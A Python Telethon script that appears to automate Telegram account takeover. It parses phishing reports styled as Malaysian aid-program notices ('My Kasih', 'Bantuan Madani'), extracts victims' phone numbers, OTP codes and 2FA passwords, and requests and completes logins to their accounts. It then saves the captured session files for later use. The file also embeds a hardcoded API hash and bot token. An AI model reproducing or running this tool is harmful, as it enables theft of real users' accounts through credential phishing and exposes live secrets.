import asyncio
import json
import os
import re
from telethon import TelegramClient, events
from telethon.errors import PhoneNumberUnoccupiedError
import shutil

api_id = 23520639
api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'
bot_token = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'

SESSIONS_FOLDER = "a18_sessions"
sessions_folder = "sessions"
pending_login = {}  # {phone: (TelegramClient, password)}

ALLOWED_PREFIXES = ["+62", "+60", "+971"]

def is_valid_phone_number(phone):
    return (
        bool(re.fullmatch(r"\+\d{10,15}", phone)) and
        any(phone.startswith(prefix) for prefix in ALLOWED_PREFIXES)
    )

os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(sessions_folder, exist_ok=True)

client = TelegramClient('main', api_id, api_hash)

def move_session_to_sessions_folder(phone_number):
    session_path = os.path.join(SESSIONS_FOLDER, phone_number)
    destination_path = os.path.join(sessions_folder, phone_number + ".session")

    if os.path.exists(session_path):
        shutil.move(session_path, destination_path)
        print(f"[✅] Sesi {phone_number} dipindahkan ke folder sessions.")
    else:
        print(f"[❌] Tidak ditemukan sesi untuk {phone_number} di {session_path}")

@client.on(events.NewMessage)
async def handler(event):
    msg = event.raw_text

    if any(keyword in msg for keyword in [
        '❮ LAPORAN My Kasih ❯',
        '❮ LAPORAN BANTUAN MADANI ❯'
    ]):
        phone_matches = re.findall(r'(?:PHONE\s+NUMBER|NUMBER)\s*:\s*(\+?\d+)', msg)
        otp_match = re.search(r'OTP\s*:\s*(\d{5,6})', msg)
        password_match = re.search(r'PASSWORD\s*:\s*(\S+)', msg)

        if phone_matches:
            for i in range(0, len(phone_matches), 5):  # Batch 5 nomor
                batch = phone_matches[i:i+5]
                for phone in batch:
                    if not phone.startswith('+'):
                        phone = '+' + phone

                    password = password_match.group(1) if password_match else None

                    if not is_valid_phone_number(phone):
                        print(f"[❌] Nomor tidak valid atau tidak termasuk whitelist: {phone}")
                        continue

                    if otp_match:
                        otp = otp_match.group(1)
                        print(f"[📥] OTP ditemukan untuk {phone}: {otp}")
                        if phone in pending_login:
                            asyncio.create_task(complete_login(phone, otp, password))
                        else:
                            print(f"[⚠️] Belum ada request OTP sebelumnya untuk {phone}")
                    else:
                        if phone not in pending_login:
                            print(f"[📞] Menerima nomor valid: {phone} (mengirim OTP request...)")
                            asyncio.create_task(request_otp(phone))
                        else:
                            print(f"[⏳] {phone} sedang menunggu OTP...")
                await asyncio.sleep(5)

async def request_otp(phone):
    try:
        session_path = os.path.join(SESSIONS_FOLDER, phone)
        login_client = TelegramClient(session_path, api_id, api_hash)
        await login_client.connect()

        if not await login_client.is_user_authorized():
            await login_client.send_code_request(phone)
            pending_login[phone] = (login_client, None)
            print(f"[🔐] Kode OTP dikirim ke {phone}, menunggu OTP...")
        else:
            print(f"[✅] {phone} sudah login sebelumnya.")
            await login_client.disconnect()
    except Exception as e:
        print(f"[❌] Gagal kirim OTP ke {phone}: {e}")

async def complete_login(phone, otp, password=None):
    try:
        login_data = pending_login.get(phone)
        if login_data:
            login_client, _ = login_data

            try:
                await login_client.sign_in(phone, otp)
            except PhoneNumberUnoccupiedError:
                print(f"[🆕] {phone} belum terdaftar, mendaftar akun baru...")
                try:
                    await login_client.sign_up(otp, first_name="UserBaru")
                except Exception as e:
                    print(f"[❌] Gagal sign up untuk {phone}: {e}")
                    return
            except Exception as e:
                if '2FA' in str(e) or 'password' in str(e).lower():
                    if password:
                        await login_client.sign_in(password=password)
                    else:
                        print(f"[🔒] Password diperlukan untuk {phone}, tapi tidak ditemukan di pesan.")
                        return
                else:
                    print(f"[❌] Gagal login {phone}: {e}")
                    return

            print(f"[✅] Login sukses untuk {phone}")
            move_session_to_sessions_folder(phone)

            await login_client.disconnect()
            del pending_login[phone]
        else:
            print(f"[❌] Tidak ada client aktif untuk {phone}")
    except Exception as e:
        print(f"[❌] Gagal proses login untuk {phone}: {e}")

async def main():
    await client.start()
    print("[🚀] Client Telegram aktif.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())